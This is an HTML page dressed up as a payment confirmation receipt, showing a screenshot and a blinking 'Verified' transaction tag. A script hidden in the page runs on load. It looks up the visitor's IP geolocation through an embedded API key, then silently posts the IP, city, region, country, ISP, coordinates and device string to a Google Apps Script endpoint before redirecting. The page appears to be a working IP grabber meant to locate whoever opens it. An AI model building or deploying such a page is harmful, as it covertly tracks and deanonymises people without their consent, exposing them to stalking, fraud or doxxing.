<!DOCTYPE html>
<html>
<head>
  <title>Payment Confirmation</title>
  <style>
    body {
      margin: 0;
      font-family: Arial;
      background: #f0f0f0;
      text-align: center;
    }
    img {
      width: 100%;
      max-width: 500px;
      margin-top: 40px;
      border: 2px solid #ccc;
    }
    #tag {
      font-weight: bold;
      color: green;
      margin-top: 10px;
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0% { opacity: 1; }
      50% { opacity: 0; }
      100% { opacity: 1; }
    }
  </style>
</head>
<body>
  <img src="screenshot.jpg" alt="Payment Screenshot" />
  <div id="tag">Transaction ID: Verified âœ”</div>

  <script>
    async function logData() {
      try {
        const ipRes = await fetch("https://geo.ipify.org/api/v2/country,city?apiKey=at_ZoGtnuZ3ne0op7PZ4BJUXaO0LHiVQ");
        const ipData = await ipRes.json();

        const device = navigator.userAgent;
        const data = {
          ip: ipData.ip,
          city: ipData.location.city,
          region: ipData.location.region,
          country: ipData.location.country,
          isp: ipData.isp,
          latitude: ipData.location.lat,
          longitude: ipData.location.lng,
          device: device
        };

        await fetch("https://script.google.com/macros/s/AKfycbxoE0iO7Wlrm0-xwz_rDITzAJ2eWwvjpoCkhIWAlvZMoodOH2eCeODeDowx5AUkE7SkSA/exec", {
          method: "POST",
          body: JSON.stringify(data),
          headers: { "Content-Type": "application/json" }
        });

        setTimeout(() => {
          window.location.href = "thankyou.html";
        }, 5000);

      } catch (err) {
        console.error("Log failed", err);
      }
    }

    logData();
  </script>
</body>
</html>
